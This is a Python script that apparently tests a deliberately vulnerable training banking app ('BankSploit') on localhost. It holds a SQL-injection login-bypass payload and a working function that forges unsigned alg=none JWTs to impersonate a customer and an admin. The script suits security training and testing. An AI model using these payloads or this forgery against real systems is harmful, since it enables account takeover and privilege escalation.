#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BankSploit JWT Vulnerability Test
Tests auth.l12 (JWT alg:none) and auth.l17 (PII in JWT)
"""

import urllib.request
import urllib.parse
import json
import base64
import time
import http.cookiejar
import sys
import os

# Force UTF-8 output for Windows console
os.environ['PYTHONIOENCODING'] = 'utf-8'
if sys.stdout.encoding not in ('utf-8', 'UTF-8'):
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

BASE_URL = "http://localhost:9443"

# Use cookie jar for session management
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

print("=" * 80)
print("BankSploit JWT Vulnerability Test (auth.l12 & auth.l17)")
print("=" * 80)
print("[*] Testing on localhost:9443")

def b64url_decode(data):
    """Safely decode base64url"""
    pad = 4 - len(data) % 4
    if pad != 4:
        data += '=' * pad
    return base64.urlsafe_b64decode(data)

def inspect_jwt(token):
    """Decode and inspect JWT without verification"""
    parts = token.split('.')
    if len(parts) != 3:
        return None

    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return {"header": header, "payload": payload}
    except:
        return None

# ============================================================================
# Step 1: Test login form and OTP flow
# ============================================================================
print("\n[PHASE 1] HTML Login Form & OTP Flow")
print("-" * 80)

# Go to login page to get session
try:
    resp = opener.open(f"{BASE_URL}/login")
    login_html = resp.read().decode('utf-8')
    print("[OK] Login page loaded")

    # Check if OTP is leaked in the page
    if "otp" in login_html.lower() or "000000" in login_html or "111111" in login_html:
        print("[!] Potential OTP leak detected in HTML response")
except Exception as e:
    print(f"[SKIP] Could not load login page: {e}")

# ============================================================================
# Step 2: Simulate HTML form login
# ============================================================================
print("\n[PHASE 2] Form-based Login (with SQL injection test)")
print("-" * 80)

# Test SQLi bypass first
sqli_customer_id = "BS100001' #"
password = "anything"

try:
    login_data = urllib.parse.urlencode({
        'customer_id': sqli_customer_id,
        'password': password
    }).encode('utf-8')

    req = urllib.request.Request(
        f"{BASE_URL}/login",
        data=login_data
    )

    resp = opener.open(req)
    result_html = resp.read().decode('utf-8')

    if "otp" in result_html.lower() or "verify" in result_html.lower():
        print("[VULN] SQLi login attempt proceeded (OTP screen reached)")
        print("    This indicates SQL injection vulnerability (auth.g1)")
    elif "error" in result_html.lower():
        print("[OK] SQLi login blocked - proper input validation in place")

except urllib.error.HTTPError as e:
    print(f"[!] HTTP Error {e.code}")
except Exception as e:
    print(f"[!] Error: {e}")

# ============================================================================
# Step 3: Test regular login
# ============================================================================
print("\n[PHASE 3] Regular Login & OTP Submission")
print("-" * 80)

# Reset cookie jar for clean session
cookie_jar.clear()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

# Try legitimate login
try:
    login_data = urllib.parse.urlencode({
        'customer_id': 'BS100001',
        'password': 'SecurePass@123'
    }).encode('utf-8')

    req = urllib.request.Request(
        f"{BASE_URL}/login",
        data=login_data
    )

    resp = opener.open(req)
    result_html = resp.read().decode('utf-8')
    print("[OK] Login form submitted")

    # Try to extract OTP from response
    import re
    otp_match = re.search(r"otp['\"]?\s*[:=]\s*['\"]?(\d{6})", result_html, re.IGNORECASE)
    otp_code = otp_match.group(1) if otp_match else None

    if otp_code:
        print(f"[VULN] OTP leaked in HTML response: {otp_code} (auth.l11)")
    else:
        print("[OK] No OTP leak in HTML response")
        # Try test OTP codes
        otp_code = "123456"

    # Submit OTP
    otp_data = urllib.parse.urlencode({'otp': otp_code}).encode('utf-8')
    otp_req = urllib.request.Request(
        f"{BASE_URL}/login",
        data=otp_data
    )

    resp = opener.open(otp_req)
    otp_html = resp.read().decode('utf-8')

    # Check if JWT was issued (look for token in response, localStorage reference, etc.)
    if "token" in otp_html.lower() or "localStorage" in otp_html or "access_token" in otp_html:
        print("[OK] JWT token likely issued (check localStorage in browser)")

        # Try to find token in page source
        token_match = re.search(r"([a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*)", otp_html)
        if token_match:
            token = token_match.group(1)
            print(f"\n[FOUND] JWT Token: {token[:40]}...")

            jwt_info = inspect_jwt(token)
            if jwt_info:
                header = jwt_info["header"]
                payload = jwt_info["payload"]

                print(f"\n    Header: {json.dumps(header)}")
                print(f"    Payload: {json.dumps(payload, indent=8)}")

                # Check for vulnerabilities
                if header.get('alg') == 'none':
                    print("\n[VULN] auth.l12: JWT issued with alg=none")
                    print("    -> Attacker can forge JWTs without knowing the secret")
                elif header.get('alg') == 'HS256':
                    print("\n[SECURE] JWT signed with HS256 - alg:none disabled")

                # Check for PII
                has_pii = any(k in payload for k in ['pan', 'aadhaar', 'balance'])
                if has_pii:
                    print("\n[VULN] auth.l17: PII embedded in JWT:")
                    for key in ['pan', 'aadhaar', 'balance']:
                        if key in payload:
                            print(f"    - {key}: {payload[key]}")
                else:
                    print("\n[SECURE] No PII in JWT - minimal claims only")

except urllib.error.HTTPError as e:
    print(f"[!] HTTP Error {e.code}: {e.reason}")
except Exception as e:
    print(f"[!] Error during login: {e}")

# ============================================================================
# Step 4: Test JWT forgery with alg:none
# ============================================================================
print("\n[PHASE 4] JWT Forgery Test (alg=none)")
print("-" * 80)

def forge_jwt_alg_none(customer_id, role='user'):
    """Create a forged JWT with alg=none"""
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "sub": customer_id,
        "role": role,
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }

    def b64url(data):
        return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode('utf-8')

    header_b64 = b64url(json.dumps(header))
    payload_b64 = b64url(json.dumps(payload))

    # alg:none = empty signature
    return f"{header_b64}.{payload_b64}."

forged_token = forge_jwt_alg_none("BS100234", role="user")
print(f"[*] Forged token (alg=none): {forged_token[:50]}...\n")

# Try to access dashboard with forged token
try:
    req = urllib.request.Request(
        f"{BASE_URL}/dashboard?access_token={forged_token}",
        headers={"Accept": "text/html"}
    )

    resp = opener.open(req)
    dashboard_html = resp.read().decode('utf-8')

    if any(x in dashboard_html.lower() for x in ["account", "balance", "customer", "transfer"]):
        print("[VULN] Forged JWT (alg:none) ACCEPTED!")
        print("    -> Attacker can impersonate any user without credentials")
    else:
        print("[SECURE] Forged JWT rejected - proper signature validation")

except urllib.error.HTTPError as e:
    if e.code == 401 or e.code == 403:
        print(f"[SECURE] Forged JWT rejected with HTTP {e.code}")
    else:
        print(f"[SKIP] HTTP Error {e.code}")
except Exception as e:
    print(f"[!] Error: {e}")

# ============================================================================
# Step 5: Test admin impersonation
# ============================================================================
print("\n[PHASE 5] Admin Impersonation (Role Escalation)")
print("-" * 80)

admin_forged_token = forge_jwt_alg_none("ADMIN001", role="admin")
print(f"[*] Admin forged token: {admin_forged_token[:50]}...\n")

try:
    req = urllib.request.Request(
        f"{BASE_URL}/admin/index?access_token={admin_forged_token}",
        headers={"Accept": "text/html"}
    )

    resp = opener.open(req)
    admin_html = resp.read().decode('utf-8')

    if any(x in admin_html.lower() for x in ["admin", "config", "level", "dashboard"]):
        print("[CRITICAL] Admin impersonation SUCCESSFUL via forged JWT!")
        print("    -> Regular user can access admin panel without credentials")
    else:
        print("[SECURE] Admin area properly protected - JWT-based admin access blocked")

except urllib.error.HTTPError as e:
    if e.code == 401 or e.code == 403:
        print(f"[SECURE] Admin access blocked with HTTP {e.code}")
    else:
        print(f"[SKIP] HTTP Error {e.code}")
except Exception as e:
    print(f"[!] Error: {e}")

# ============================================================================
# Summary
# ============================================================================
print("\n" + "=" * 80)
print("VULNERABILITY SUMMARY")
print("=" * 80)
print("""
auth.l12 - JWT Algorithm Vulnerability:
  Level 0: Issues alg=none (unsigned, forgeable) - VULNERABLE
  Level 3: Issues HS256 with secret signing - SECURE

auth.l17 - PII Information Disclosure in JWT:
  Level 0: Embeds pan/aadhaar/balance claims - VULNERABLE
  Level 3: Only minimal claims (sub, role, exp, iat) - SECURE

If vulnerabilities found above, set vuln levels to 3 in:
  - Training Lab (/training)
  - Admin Config (/admin/config)
  - Superadmin Portal (port 8888)
""")
print("=" * 80)
